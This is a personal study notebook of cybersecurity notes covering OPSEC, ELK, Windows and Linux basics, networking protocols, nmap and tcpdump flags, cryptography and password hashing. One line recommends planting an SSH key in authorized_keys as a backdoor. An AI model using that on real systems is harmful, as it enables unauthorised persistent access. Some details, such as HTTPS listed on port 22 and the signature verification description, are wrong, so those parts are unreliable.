# CyberNotebook
Collection of notes regarding Cybersecurity vocabulary for my personal reference.

## OPSEC
<b>Step 1: Identify critical information</b>

Critical information may include:
+ Intentions
+ Capabilities
+ Activities
+ Limitations

<b>Step 2: Analyse threats</b>

Answer the following questions:
+ Who is the adversary?
+ What are the adversary's goals?
+ What tactics, techniques, and procedures (TTPs) do they use?
+ What critical information has the adversary obtained?

<i>threat = adversary + intent + capability</i>

<b>Step 3: Analyse vulnerabilities</b>

An OPSEC vulnerability occurs when an adversary can obtain critical information, analyse them, and affect your plans.


<b>Step 4: Assess risks</b>

Risk assessment requires the following:
+ Learning the possibility of an event taking place
+ Estimating the expected cost of the event
+ Assessing the adversary's ability to exploit vulnerabilities


<b>Step 5: Apply appropriate countermeasures</b>

Countermeasures are designed to prevent an adversary from detecting critical information, provide alternative interpretations of critical information/indicators, or deny the advesary's collection system.

Consider these factors:
+ Efficiency of the countermeasure in reducing the risk
+ Cost of the countermeasure compared to the impact of the vulnerability being exploited
+ Possibility that the countermeasure can reveal information to the adversary

## Elastic/ELK Stack
Elastic stack is the collection of different open source components that help users take data from any source and format to perofrm a search, analyse, and visualise data in real-time.

The components include:
+ <i>Elasticsearch</i> - full-text search and analytics engine used to store JSON-formatted documents; supports RESTFul API to interact with the data
+ <i>Logstash</i> - data processing engine used to take data from different sources, apply filters/normalise them, and send to the destination such as Kibana/listening port; configuration file is dvided into input, filter, and output parts
+ <i>Beats</i> - host-based agent known as Data-shippers used to ship/transfer data from endpoints to elasticsearch; each beat is a single-purpose agent that sends specific data (e.g. Winlogbeat:windows event logs, Packetbeat:network traffic flows)
+ <i>Kibana</i> - web-based data visualiusation that works with elasticsearch to analyse, investigate, and visualise data streams in real-time; allows users to create multiple visualisations and dashboards

## Atomic Red Team
Atomic Red Team is an open-source framework for performing security testing and threat emulation, consisting of TTPs that simulate various types of attacks and security threats (e.g. malware, phishing attacks, network compromise)

<i>Atomics</i> - different testing techniques based on the MITRE ATT&CK framework that security analysts can use to emulate a specific technique.

## Windows Fundamentals
### NTFS
<i>New Technology File System (NTFS)</i> - file system used in modern version of Windows

NTFS addresses many limitations of previous file systems (i.e. FAT16/FAT32, HPFS):
+ Supports larger file sizes
+ Sets specific permissions on folders/files
+ Folder/file compression
+ Encryption using Encryption File System (EFS)

Permissions include:
+ Full control
+ Modify
+ Read & execute
+ List folder contents
+ Read
+ Write

<i>Alternate Data Streams (ADS)</i> - file attribute specific to NTFS

### Windows\System32
C:\Windows traditionally contains the OS. This is where the environmental variables are. The system environment variable for the Windows directory is <i>%windir%</i>.

System32 folder holds all the critical files for the OS.

### User Accounts, Profiles, & Permissions
User account type can either be: 
+ <i>administrator</i> - can make changes to the system (e.g. add users, delete users, modify groups, modify system settings, etc)
+ <i>standard user</i> - can only make change to folders/files attributed to the user

Running <i>lusrmgr.msc</i> will open the <i>Local User and Group Management</i>.

<i>User Account Control (UAC)</i> - prompts confirmation from the admin user when an operation requiring higher-level privileges needs to execute

### MSConfig
The <i>System Configuration</i> utility is for troubleshooting, primarily to help diagnose startup issues.

The utility has five tabs:
1. General - select what devices and services to load on boot (i.e. Normal, Diagnostic, Selective)
2. Boot - define various boot options for the OS
3. Services - lists all services configured for the system, both running or stopped
4. Startup - manage startup items
6. Tools - various utilities

Tools include:
+ <i>Change UAC Settings</i>
+ <i>Computer Management (compmgmt)</i>, which includes Task Scheduler, Event Viewer, Device Manager, Local Users & Groups, etc.
+ <i>System Information (msinfo32)</i> gathers information and displays hardware, system components, and software environment
+ <i>Resource Monitor (resmon)</i> displays CPU, memory, disk, and network usage information; start, stop, pause and resume services
+ <i>Command Prompt (cmd)</i>
+ <i>Registry Editor (regedit)</i> edit Windows Registry, which is the database that stores user profiles, installed applications, property sheet settings for folders/application icons, hardware, used ports

### Windows Security
<i>Windows Update</i> provides security updates, feature enhancements, and patches for the OS, and other products. 

**control /name Microsoft.WindowsUpdate**: access Windows Update

<i>Windows Security</i> centralises the management of device and data protection tools. Protection areas include:
+ Virus & threat protection - scans, threat history, manage settings, check updates, ransomware protection
+ Firewall & network protection - firewall settings (i.e. domain, private, public), advanced settings; **WF.msc**: opens Windows Defender Firewall
+ App & browser control - Microsoft Defender Smartscreen, check apps and files, exploit protection 
+ Device security - core isolation (i.e. memory integrity), security processor details (i.e. TPM)

<i>BitLocker</i> is a data protection feature using drive encryption. Most protection is achieved when used with a TPM version 1.2 or later. 

<i>Volume Shadow Copy Service (VSS)</i> creates a consistent shadow copy (i.e. snapshot, point-in-time copy) of data to be backed up. These copies are stored on the System Volume Information folder on each drive that has protection enabled. If enabled (i.e. System Protection is turned on), the following tasks can be performed:
+ Create a restore point
+ Perform system restore
+ Configure restore settings
+ Delete restore points

## Linux Shells
Linux has different types of shells available, each with their own features.

**echo $SHELL**: displays which shell you are using

**cat /etc/shells**: lists all installed shells on the system

To switch between these shells, simply type the shell name (e.g. **zsh**)

Some common shells include:
| Feature | Bash | Fish | Zsh |
| :-----: | :------: | :------: | :------: |
| Full Name | Bourne Again Shell | Friendly Interactive Shell | Z Shell |
| Scripting | Offers widely compatible scripting w/ documentation | Limited scripting features | Combines Bash shell scripting with some extra features |
| Tab Completion | Basic tab completion | Advanced tab completion | Can be extended by using plugins |
| Customisation | Basic customisation | Offers customisation using interactive tools | Advanced customisation through oh-my-zsh framework |
| User Friendliness | Less user-friendly | Most user-friendly | Highly user-friendly with proper customisation |
| Syntax Highlighting | Not available | Built-in | Can be used with some plug-ins |

Script files can be edited using any text editor and has the extension <i>.sh</i>. Every script should also start from shebang: <i>#!</i> followed by the name of the interpreter (e.g. /bin/bash)

Some basic script commands:
+ **read [variable_name]**: asks user input and saves to a variable
+ **for i in {x..y}; do**: for loop
+ **if [ "$variable" = "Text" ]; then**: if statement

To execute scripts, it has to be given execution permissions. 

**chmod +x [variable_script.sh]**: give execution permission to the script

## Networking Basics
<i>Networks</i> are the connections between technological devices. These can be formed from two devices to billions. A network can be one of two types:
+ Private
+ Public

The <i>Internet</i> is simply a giant network that consists of many smaller networks. The first iteration was ARPANET in the 1960s, which then led to the creation of the World Wide Web (WWW). 

Devices have two identifiable fingerprints: 
+ <i>Internet Protocol (IP) Address</i> - identifies a host on a network; can be public or private; can be IPv4 or IPv6
+ <i>Media Access Control (MAC) Address</i> - unique 12 hexadecimal number that identifies vendor and unique address of the network interface

RFC 1918 defines the following three ranges of private IP addresses:
+ 10.0.0.0 - 10.255.255.255 (10/8)
+ 172.16.0.0 - 172.31.255.255 (172.16/12)
+ 192.168.0.0 - 192.168.255.255 (192.168/16)

### Networking Devices
A <i>switch</i> is a device that aggregates multiple networking-capable devices using ethernet. 

A <i>router</i> is a device that connects networks and pass data between them. Routing involves creating a path between networks for data to be delivered. 

### Routing Algorithms
Routing algorithms are used by routers to figure out which appropriate links to send packets to. Some algorithms include:
+ <i>Open Shortest Path First (OSPF)</i> - routers hare information about network topology and calculate the most efficient paths; routers exchange updates about the state of their connected links and networks
+ <i>Enhanced Interior Gateway Routing Protocol (EIGRP)</i> - a Cisco proprietary protocol; routers share information about the networks they can reach and the bandwidth/delay costs associated with these routes
+ <i>Border Gateway Protocol (BGP)</i> - the primary protocol used on the Internet; allows different networks (e.g. ISPs) to exchange routing information and establish paths between the networks
+ <i>Routing Information Protocol</i> - often used in small networks; routers share information about networks they can reach and the number of hops required; each router builds a routing table

### Subnets
<i>Subnetting</i> is used to split the number of hosts that can fit in a network, represented by a number called the subnet mask (e.g. 255.255.255.0). Subnets use IP addresses in three ways:
+ Identify the network address (i.e. 192.168.1.0)
+ Identify the host address (i.e. 192.168.1.100)
+ Identify the default gateway (i.e. 192.168.1.254)

### VLANs
A <i>Virtual Local Area Network (VLAN)</i> allows specific devices within a network to be virtually split up. This sepration provides security by enforcing rules to determine how specific devices communicate with each other.

### ISO OSI Model
The <i>Open Systems Interconnection (OSI) Model</i> provides a framework dictating how all networked devices send, receive, and interpret data. This model consists of seven layers, wherein specific process take place, and pieces of information are added to the data. These layers are the following:

| Layer # | Layer Name | Main Function | Example Protocols & Standards |
| :-----: | :------: | :------: | :------: |
| Layer 7 | Application layer | Providing services and interfaces to applications | HTTP, FTP, DNS, POP3, SMTP, IMAP |
| Layer 6 | Presentation layer | Data encoding, encryption, and compression | Unicode, MIME, JPEG, PNG, MPEG |
| Layer 5 | Session layer | Establishing, maintaining, and synchronising sessions | NFS, RPC |
| Layer 4 | Transport layer | End-to-end communication and data segmentation | UDP, TCP |
| Layer 3 | Network layer | Logical addressing and routing between networks | IP, ICMP, IPSec |
| Layer 2 | Data-Link layer | Reliable data transfer between adjacent nodes | 802.3, 802.11 |
| Layer 1 | Physical layer | Physical data transmission media | Electrical, optical, and wireless signals |

### TCP/IP Model (RFC 1122)
While the OSI model is conceptual, the <i>Transmission Control Protocol/Internet Protocol (TCP/IP) model</i> is implemented. A strength of this model is that it allows a network to continue to function as parts of it become out of service. This is made possible due to the design of routing protocols to adapt as network topologies change. This model is as follows:

| Layer # | OSI Model | TCP/IP Model | Example Protocols & Standards |
| :-----: | :------: | :------: | :------: |
| Layer 7 | Application layer | Application layer | HTTP, FTP, DNS, POP3, SMTP, IMAP |
| Layer 6 | Presentation layer |  |  |
| Layer 5 | Session layer |  |  |
| Layer 4 | Transport layer | Transport layer | UDP, TCP |
| Layer 3 | Network layer | Internet layer | IP, ICMP, IPSec |
| Layer 2 | Data-Link layer | Link layer | 802.3, 802.11 |
| Layer 1 | Physical layer |  |  |

### Packets
<i>Packets</i> are small pieces of data that combine together to make a piece of information/message. <i>Frames</i> are slightly different as they are at layer 2, meaning no information such as IP addresses are included. These have a set of headers that include:
+ Time to Live (TTL) - sets an expiry timer for the packet
+ Checksum - provides integrity checking, where changes in data will indicated corrupted packets
+ Source Address - IP address of the device the packet is being sent from
+ Destination Address - IP address the packet is being sent to

### Encapsulation
<i>Encapsulation</i> is the process of every layer adding a header/trailer to a received unit of data. The process is as follows:
1. We start with application data.
2. At the transport layer, a TCP or UDP header is added to create a <i>TCP segment</i> or <i>UDP datagram</i>.
3. At the network layer, an IP header is added to get an <i>IP packet</i>, which can be router over the Internet.
4. Lastly, a header and trailer is added to get a <i>WiFi/Ethernet frame</i> at the link layer.

### TCP
<i>Transmission Control Protocol (TCP)</i> guarantees that any data sent will be received on the other end. This protocol operates at the transport layer (i.e. layer 4). This is done via a 'three-way handshake':
1. SYN message is send by the client; initiates a connection and sychronises the two devices.
2. SYN/ACK packet is sent by the receiving device.
3. ACK packet is used to acknowledge that the series of packets have been received.
4. Once the connection has been established, DATA message is sent.
5. FIN packet is used to cleanly close the connection after completion.
6. *A RST packet is the last resort used to abruptly end all communication, usually done if there is a problem.

### UDP
<i>User Datagram Protocol (UDP)</i> is a stateless protocol that does not require a constant connection between devices (i.e. three-way handshake not needed). This also means that there are no data integrity safeguards in place. However, UDP communication is much faster than TCP. This protocol operates at the transport layer (i.e. layer 4)

### Ports & Port Forwarding
Networking devices use <i>ports</i> to communicate with each other. There are rules for which protocols apply to which ports. These include the following:
+ 21 for FTP
+ 22 for SSH
+ 80 for HTTP
+ 443 for HTTPS
+ 445 for SMB
+ 3389 for RDP

<i>Port fowarding</i> allows connection of application and services to the internet by opening specific ports. This can be configured at a network's router.

### DHCP
<i>Dynamic Host Configuration Protocol (DHCP)</i> automatically assigns IP addresses to devices in a network. This is an application-level protocol that relies on UDP. The server listens on UDP port 67, and the client sends from UDP port 68. 

This protocol follows the Discover, Offer, Request, and Acknowledge (DORA) steps. This process is done by:
1. A newly connected device sends out a DHCPDISCOVER request to see if any DHCP servers are on the network.
2. The DHCP server replies with a DHCPOFFER, an IP address the device can use.
3. The device then sends a DHCPREQUEST, confirming that it wants the IP address.
4. Lastly, the DHCP server sends a DHCPACK, acknowledging that the device can start using the IP address.

### ARP
<i>Address Resolution Protocol (ARP)</i> allows a device to associate its MAC address with an IP address on a network (i.e. translation from layer 3 to layer 2 addressing). Each device on a network will keep logs of the MAC addresses associated with other devices. 

This is done by:
1. ARP Request is broadcasted on the network (i.e. asking for the IP address for a particular MAC address).
2. The owning device will send an ARP Reply with its MAC address.
3. The requesting device maps and stores this in its ARP cache.

Note that an ARP Request or ARP reply is not encapsulated within a UDP or IP packet. Rather, it is encapsulated directly within an Ethernet frame.

### ICMP
<i>Internet Control Message Protocol (ICMP)</i> is mainly for network diagnotics and error reporting. Two popular commands that rely on ICMP are:
+ **ping**: uses ICMP (i.e. ICMP type 8 - Echo Request, ICMP type 0 - Echo Reply) to test connectivity to a target system and measures rount-trip time (RTT)
+ **tracert/traceroute**: uses ICMP (i.e. ICMP type 11 - Time Exceeded message) to discover the route from your host to target machine

### NAT
<i>Network Address Translation (NAT)</i> allows the use of one public IP address to provide Internet access to many private IP addresses. This is done by NAT-supporting routers maintaining a table that translates network addresses between internal and external networks. In effect, the internal network would use a private IP address (i.e. intra-network), while the external network (i.e. gateway to the Internet) would use the public IP address.

## Networking Core Protocols
Summary of default port numbers of the protocols listed below:

| Protocol | Transport Protocol | Default Port # |
| :------: | :----------------: | :------------: |
| TELNET | TCP | 23 |
| DNS | UDP/TCP | 53 |
| HTTP | TCP | 80 |
| HTTPS | TCP | 443 |
| FTP | TCP | 21 |
| SMTP | TCP | 25 |
| POP3 | TCP | 110 |
| IMAP | TCP | 143 |

### Telnet
The <i>Teletype Network (TELNET)</i> protocol allows connection and communication with a remote system and issue text commands. This can be used for remote administration or to connect to any server listening on a TCP port number.

**telnet [ip_address] [port_num]**: connects to a target machine at a specific port

### DNS
(Remembering Addresses)

<i>Domain Name System (DNS)</i> allows a simple way for devices to communicate with the internet without remembering IP addresses. To visit a website, the website name can be entered instead.
+ A <i>Top-Level Domain (TLD)</i> is the most righthand part of a domain name (e.g. .com in tryhackme.com).
+ A <i>Second-Level Domain</i> includes the domain name (e.g. tryhackme in tryhackme.com)
+ A <i>subdomain</i> sits on the left-hand side of the domain name, using a period to separate it (e.g. admin in admin.tryhackme.com). Multiple subdomains that are split with periods can create longer names (e.g. jupiter.servers in jupter.servers.tryhackme.com)

Types of DNS records include:
+ A Record - resolve to IPv4 addresses
+ AAAA Record - resolve to IPv6 addresses
+ CNAME Record - resolve to another domain name
+ MX Record - resolve to the address of the servers that handle email for the domain being queried
+ TXT Record - free text fields where any-text based data can be stored; commonly used to list servers that have authority to send emails on behalf of the domain; can also be used to verify ownership of the domain name

DNS request process:
1. When requesting a domain name, your device first checks its local cache. If not available, a request to your Recursive DNS server will be made.
2. A Recursive DNS Server then check its own local cache. If the request cannot be found locally, it queries the internet's root DNS servers.
3. The root server will recognise the TLD of the request and refer you to the correct TLD server.
4. The TLD server holds records for where to find the authoritative server for the DNS request, where DNS records for domain names are kept.
5. The DNS record is then sent back to the Recursive DNS Server, where a local copy will be cached for future requests. This record will have a TTL value.

DNS operates at layer 7, using UDP port 53 by default and TCP port 53 as a default fallback.

### WHOIS
A <i>WHOIS</i> record provides information about the entity that registered a domain name, including their name, phone number, email, and address. Note that privacy services can hide information, if required.

**whois**: looks up the WHOIS records of a registered domain name

### HTTP
(Accessing the Web)

<i>HyperText Transfer Protocol (HTTP)</i> is the set of rules used for communicating with web servers for the transmition of webpage data (e.g. HTML, images, videos, etc)

<i>Cookies</i> are small pieces of data that is stored on your computer. As HTTP request is stateless (i.e. does not keep track of previous requests), cookies can be used to remind the web server information about you, your settings, or whether you have been to the website before.

### FTP
(Transferring Files)

<i>File Transfer Protocol (FTP)</i> is designed to transfer files, which it can achieve at higher speeds than HTTP.

Example FTP commands include:
+ USER [username] - used to input the username
+ PASS [password] - used to enter the passwords
+ RETR [file_name] - used to download a file from the FTP server to the client
+ STOR [file_name] - used to upload a file from the client to the FTP server

FTP server listens on TCP port 21 by default. Data transfer is conducted via another connection from the client to the server.

**ftp [IP address]**: connects to the remote FTP server using the local ftp client

### SMTP
(Sending Email)

<i>Simple Mail Transfer Protocol (SMTP)</i> defines how a mail client communicates with a mail server and how a mail server communicates with another.

Example SMTP commands used by the mail client to the SMTP server:
+ HELO/EHLO - initiates an SMTP session
+ MAIL FROM [email_address] - specifies the sender's email address
+ RCPT TO [email_address] - specifies the recipient's email address
+ DATA [text] - indicates that the client will begin sending the email contents
+ . - indicates the end of the email message

The SMTP server listens on TCP port 25 by default.

### POP3
(Receiving Email)

The <i>Post Office Protocol v3 (POP3)</i> allows the client to communicate with a mail server to retrieve email messages.

Some common POP3 commands include:
+ USER [username] - identifies the user
+ PASS [password] - provides the user's password
+ STAT - requests the number of messages and total size
+ LIST - list all messages and their size
+ RETR [message_number] - retrieves the specified message
+ DELE [message_number] - marks a message for deletion
+ QUIT - ends the POP3 session, while applying changes (e.g. deletions)

The POP3 server listens on TCP port 110 by default.

### IMAP
(Syncrhonising Email)

The <i>Internet Message Access Protocol (IMAP)</i> allows synchronising read, moved, and deleted messages. This is particularly useful for checking emails via multiple clients. As an effect, IMAP tends to use more storage as emails are kept on the server to be syncrhonised across the email clients.

Some example of IMAP protocol commands include:
+ LOGIN [username] [password] - authenticates the user
+ SELECT [mailbox] - selects the mailbox folder
+ FETCH [mail_number] [data_item] - gets the message number and required data (e.g. fetch 3 body[])
+ COPY [sequence_set] [data_item] - copies the specified messages to another mailbox
+ LOGOUT - logs out

The IMAP server listens on TCP port 143 by default.

## Networking Secure Protocols
### TLS
<i>Transport Layer Security (TLS)</i> is a cryptographic protocol operating at the transport layer, which allows secure communication between a client and a server over an insecure network. TLS ensures that no one can read or modify the exchanged data. <i>Secure Sockets Layer (SSL)</i> is the precursor to TLS.

TLS revolves around the use of signed TLS certificates. The process is as follows:
1. Server administrator submits a Certificate Signing Request (CSR) to a Certificate Authority (CA).
2. The CA verifies the CSR and issues a digital certificate.
3. Once the signed certificate is received, it can be used to identify the server/client to others, who can confirm the validity of the signature. Certificates of the signing authorities are installed on the host.

A summary of secure versions of protocols:

| Protocol | Default Port # |
| :------: | :------------: |
| HTTPS | 22 |
| HTTPS | 443 |
| SMTPS | 465/587 |
| POP3S | 995 |
| IMAPS | 993 |

### SSH
<i>Secure Shell (SSH)</i> provides a secure alternative to telnet. Nowadays, SSH clients are based on OpenSSH libraries and source code.

OpenSSH offers several benefits, including:
+ Secure Authentication - supports password-based authentication, public key, and two-factor authentication
+ Confidentiality - provides end-to-end encryption; notifies of new server keys to protect against MitM attacks
+ Integrity - cryptography protects integrity of traffic
+ Tunneling - creates a secure tunnel to route other protocols through (i.e. a VPN-like connection)
+ X11 Forwarding - allows use of graphical application over the network if connecting to a Unix-like system with a GUI

**ssh [username@hostname]**: connects to an SSH server; add **-X** to support running graphical interfaces

The SSH server listens on port 22.

### HTTPS
<i>HyperText Transfer Protocol Secure (HTTPS)</i> is the secure version of HTTP, where data is encrypted to stop people from seeing data being received and sent. It also gives assurances that you are talking to the correct web server, not a spoof. Essentially, this is HTTP with TLS.

Requesting a page over HTTPS will require the following three steps after resolving the domain name:
1. Establish a TCP three-way handshake with the target server
2. Establish a TLS session
3. Communicate using the HTTP protocol (e.g. issue HTTP request like Get / HTTP/1.1)

Opening the contents of HTTPS packets will return encrypted text. An encryption key is needed to read the contents.

### SMTPS, POP3S, & IMAPS
Adding TLS to SMTP, POP3, and IMAP appends an S for "Secure." They work the same way as HTTPS.

### SFTP & FTPS
<i>SSH File Transfer Protocol (SFTP)</i> allows secure file transfer. It is part of the SSH protocol suite and shares port 22. SFTP commands are Unix-like and can differ from FTP commands.

Note that SFTP is different from FTPS. <i>File Transfer Protocol Secure (FTPS)</i> uses TLS and port 990. FTPS requires certificate setup and can be tricky to allow over firewalls as it uses separate connections for control and data transfer. Meanwhile, SFTP setup is easy as it only requires enabling an option with OpenSSH.

**sftp [username@hostname]**: log in SFTP server

**get [file_name]**: download files

**put [file_name]**: upload files

### VPN
A <i>Virtual Private Network (VPN)</i> allows devices on separate networks to communicate securely by creating a dedicated path between each other over the Internet using a tunnel. Connected devices form their own private network. Some existing VPN technologies include:
+ PPP - allows for authentication and data encryption by using private keys and public certificates; not capable of leaving a network by itself (i.e. non-routable)
+ PPTP - allows data from PPP to travel and leave a network; weakly encrypted in comparison to alternatives
+ IPSec - encrypts data using the IP framework; difficult to set up but has strong encryption and device support

## Networking Tools
### Wireshark
<i>Wireshark</i> is an open-source network packet analyser tool. It can sniff and investigate live traffic and inspect packet captures (PCAP). Its use cases include:
+ Detecting and troubleshooting network problems (e.g. network load failure points and congestion)
+ Detecting security anomalies (e.g. rogue hosts, abnormal port usage, and suspicious traffic)
+ Investigating and learning protocol details (e.g. response codes and payload data)

Note that Wireshark is not an IDS. It only allows packet discovery and investigation. It does not modify packets.

Wireshark uses OSI layers to break down packets and use these layers for analysis. Packets details include:
+ The Frame (Layer 1) - shows what frame/packet you are looking at at the Physical layer
+ Source MAC (Layer 2) - shows the source and destination MAC addresses at the Data Link layer
+ Source IP (Layer 3) - shows the source and destination IPv4 addresses at the Network layer
+ Protocol (Layer 4) - shows the protocol used (i.e. UDP/TCP) and source and destination ports at the Transport layer
+ Protocol Errors - a continuation of the fourth layer that shows segments from TCP that need reassembly
+ Application Protocol (Layer 5) - shows details specific to the protocol used (e.g. HTTP, FTP, and SMB) at the Application layer
+ Application Data - extension of the fifth layer and can show application-specific data

### tcpdump
<i>tcpdump</i> is a tool that captures network traffic and taking a closer look at various protocols. This tool and its <i>libpcap</i> library were released for Unix-like systems. <i>winpcap</i> is the ported version to Windows.

**tcpdump**: main command 

Command line options for packet capture:
+ **-i [interface]**: captures packets on a specific network interface
+ **-w [file_name]**: writes captured packets to a file
+ **-r [file_name]**: reads captured packets from a file
+ **-c [count]**: captures a specific number of packets
+ **-n**: do not resolve IP addresses
+ **-nn**: do not resolve IP addresses and protocol numbers
+ **-v**: verbose display; can be **-vv** or **-vvv**

Some filtering options:
+ **host [ip_address]** or **tcpdump host [host_name]**: filters packets by IP or hostname
+ **src host [ip_address]**: filters by a specific source host
+ **dst host [ip_address]**: filters by a specific destination host
+ **port [port_number]**: filters by port number
+ **src port [port_number]**: filters by specified source port number
+ **dst port [port_number]**: filters by specified destination port number
+ **[protocol]**: filters by protocol (e.g. ip, ip6, icmp)
+ **greater [length]** or **tcpdump less [length]**: filters packets that have a length >= or <= than specified length
+ **[proto[expr:size]]**: refer to contents of any byte in the header
+ **[tcp[tcpflags]]**: refer to TCP flags field (e.g. tcp-syn, tcp-ack, tcp-fin, tcp-rst, tcp-push)

Some packet display options:
+ **-q**: quick output (i.e. brief packet info)
+ **-e**: print link-level header (i.e. MAC address)
+ **-A**: show in ASCII
+ **-xx**: show in hexadecimal format (i.e. hex)
+ **-X**: show headers and data in hex and ASCII

### nmap
<i>nmap</i> is a network scanner tool that can 1) discover other live devices on this/other network and 2) find out the network services running on these live devices (e.g. SSH, web servers)

**nmap**: main command to initiate nmap tasks; add **sudo** or be logged in as root
for full features

For listing targets:
+ **-sL [ip_address/subnet]**: lists the targets to scan without actually scanning them
  
For host discovery:
+ **-sn [ip_address/subnet]**: discover online hosts on a network

For port scanning:
+ **-sT [ip_address/subnet]**: attempt to complete TCP three-way handshake with every target TCP port (i.e. Connect Scan)
+ **-sS [ip_address/subnet]**: instead of a full three-way handshake, only the TCP SYN packet is sent (i.e. SYN Scan/Stealth)
+ **-sU [ip_address/subnet]**: scan for UDP services
+ **-F**: fast mode that scans the 100 most common ports
+ **-p[range]**: specifies a range of port numbers to scan; **-p-** scans all ports
+ **-Pn**: initiate a force scan (i.e. scan hosts that appear to be down)
  
For version detection:
+ **-O**: enable OS detection
+ **-sV**: enables version detection
+ **-A**: enables OS detection, version scanning, traceroute, and others

For timing control:
+ **-T[0-5]**: timing template; can be: 0-paranoid, 1-sneaky, 2-polite, 3-normal, 4-aggressive, 5-insane
+ **--min-parallelism [num_probes]** / **--max-rate [num_probes]**: minimum/maximum number of parallel probes
+ **--host-timeout [seconds]**: max amount of time to wait for a target host

For controlling real-time output:
+ **-v**: verbose output; can be **-vv**, **-vvvv**, **-v2**, **v4**
+ **-d**: debugging-level output; same with v, can add more d (i.e. up to **-d9**)

For controlling report output:
+ **-oN [file_name]**: normal output save
+ **-oX [file_name]**: XML output save
+ **-oG [file_name]**: grep-able output (i.e. for **grep** and **awk**)
+ **-oA [base_name]**: output in all major formats

## Cryptography
Cryptography is used to protect confidentiality, integrity, and authenticity. It is the practice and study of techniques for secure communication and data protection where we expect the presence of adversaries and third parties.

Key terminologies include:
+ <i>Plaintext</i> - original, readable message or data before encryption (e.g. document, image, multimedia file, any other binary data)
+ <i>Ciphertext</i> - scrambled, unreadable version of the message after encryption
+ <i>Cipher</i> - algorithm or method to convert plaintext into ciphertext and back again
+ <i>Key</i> - string of bits the cipher uses to encrypt or decrypt data
+ <i>Encryption</i> - process of converting plaintext into ciphertext using a cipher and a key
+ <i>Decryption</i> - reverse process of encryption, converting ciphertext back into plaintext using a cipher and a key

The two main categories of encryption:
1. <i>Symmetric</i> - uses the same key to encrypt and decrypt data; also known as <i>private key cryptography</i> (e.g. DES, 3DES, AES)
2. <i>Asymmetric</i> - uses a pair of keys, one to encrypt (i.e. the public key) and the other to decrypt (i.e. the private key)

### RSA
<i>RSA</i> is a public-key encryption algorithm. It is based on factoring large numbers. RSA is used for digital signtaures, key transport, and authentication (i.e. proves the identity of the person you are talking to via digital signing)

The main variables to know include:
+ <i>p</i> and <i>q</i> are large prime numbers
+ <i>n</i> is the product of p and q
+ The public key is n and <i>e</i>
+ The private key is n and <i>d</i>
+ <i>m</i> is used to represent the original message (i.e. plaintext)
+ <i>c</i> represents the encrypted text (i.e. ciphertext)

Useful tools include [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) and [rsatool](https://github.com/ius/rsatool).

### Diffie-Hellman Key Exchange
<i>Diffie-Hellman</i> is often used with RSA for key agreement. This can provide the means to establish a shared key for symmetric cryptography for the key exchange.

Steps of this process is as follows:
1. Agree on public variables <i>p</i> and <i>g</i>
2. Each party chooses a private integer <i>a</i> and <i>b</i>
3. Each party calculates their public key <i>A = g^a mod p</i> and <i>B = g^b mod p</i>
4. Each party sends the keys to each other (i.e. the key exchange)
5. Calculate shared secret using the received public key using their own private key

### SSH Keys
SSH key authentication uses public and private keys to prove the client is valid and an authorised user on the server. By default, these are RSA keys. However, you can choose which algorithm to generate and add a passphrase to encrypt the SSH key.

**ssh-keygen**: program to generate key pairs

The <i>~/.ssh folder</i> is the default place to store these keys for OpenSSH. The <i>authorized_keys</i> file holds the public eys that are allowed to access to the server if key authentication is enabled.

SSH keys are an excellent way to upgrade a reverse shell. Leaving an SSH key in the authorized keys file on a machine can be a useful backdoor for CTFs, penetration testing, and red teaming.

### Digital Signatures & Certificates
<i>Digital signatures</i> provide a way to verify the authenticity and integrity of a digital message or document. This means we know who created or modified these files. 

The simplest form of digital signature is encrypting the document with your private key. To verify this signature, they would encrypt it with your public key and check if the files match.

<i>Certificates</i> are linked to digital signatures. These certify that the website you are visiting is legitimate. This is commonly used in HTTPS.

### PGP & GPG
<i>Pretty Good Privacy (PGP)</i> is software that that can encrypt files. 

<i>GnuPG (GPG)</i> is an open-source implementation of the OpenPGP standard. 

GPG is commonly used in email to protect confidentiality of email messages. It can be used to sign an email and confirm its integrity. Additionally, GPG can be used to decrypt files.

**gpg --import [key_file.key]**: import key 

**gpg --decrypt [message.gpg]**: decrypt messages

## Hashing
A <i>hash value</i> is a fixed-size string that is computed by a hash function. 

A <i>hash function</i> takes an input of an arbitrary size and returns an output of fixed length (i.e. the hash value). Good hashing algorithms will be relatively fast to compute and slow to reverse. Any slight change in the input data should cause a significant change in the output.

<i>Hashing</i> helps protect data's integrity and ensure password confidentiality. For instance, two main use cases for hashing include:
1. Password storage (i.e. authentication)
2. Data integrity

### Password Storage
When it comes to passwords, these are three insecure practices:
+ Storing passwords in plaintext
+ Storing passwords using a deprecated encryption
+ Storing passwords using an insecure hashing algorithm

Instead of storing passwords in plaintext, storing hash values is more secure. However, these are still vulnerable by using <i>rainbow tables</i>, which are lookup tables of hashes to plaintext (e.g. [CrackStation](https://crackstation.net/), [Hashes.com](https://hashes.com/en/decrypt/hash]).

<i>Salting</i> is a means to protect against rainbow tables. The salt is a randomly generated value stored in the database and should be unique to each user. These are added to either the start or the end of the password before it is hashed.

### Recognising Password Hashes
On Linux, password hashes are stored in <i>/etc/shadow</i>, which is only readable by root. The file contains password information, where each line contains nine fields separated by colons. More information can be found using **man 5 shadow**.

The encrypted password field contains the hashed passphrase with four components(e.g. $prefix$options$salt$hash):
1. prefix (i.e. algorithm id)
2. options (i.e. parameters)
3. salt
4. hash

Some of the most common Unix-style password prefixes you might encounter include:
| Prefix | Algorithm |
| :------: | :-----: |
| $y$ | yescrpyt |
| $gy$ | gost-yescrypt |
| $7$ | scrypt |
| $2b$, $2y$, $2a$, $2x$ | bcrypt |
| $6$ | sha512crypt |
| $md5 | SunMD5 |
| $1$ | md5crypt |

More details can be found using **man 5 crypt**.

A usefule resource for hash formats and password prefixes can be found in [Hashcat Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) page.

MS Windows passwords are hashed using NTLM, a variant of MD4. They are visually identical to MD4 and MD5 hashes. Password hashes are stored in the <i>Security Accounts Manager (SAM)</i>. 

### Data Integrity Checking
Hashing can be used to check that files have not been altered. Even if a single bit changes, the hash will change significantly. You can use them to ensure that files have not been modified or to ensure that a downloaded file is identical to the file on the web server. 

<i>Keyed-Hash Message Authentication Code (HMAC)</i> is a type of message authentication code (MAC) that uses a cryptographic hash function in combination with a secret key to verify the authenticity of data. These can be used to ensure that the person who created the HMAC is who they say they are (i.e. authenticity) by using a secret key. This is done in with the following steps:
1. A secret key is padded to the block size of the hash function.
2. A padded key is XORed with a constant (i.e. block fo zeroes or ones).
3. Message is hashed using the hash function with the XORed key.
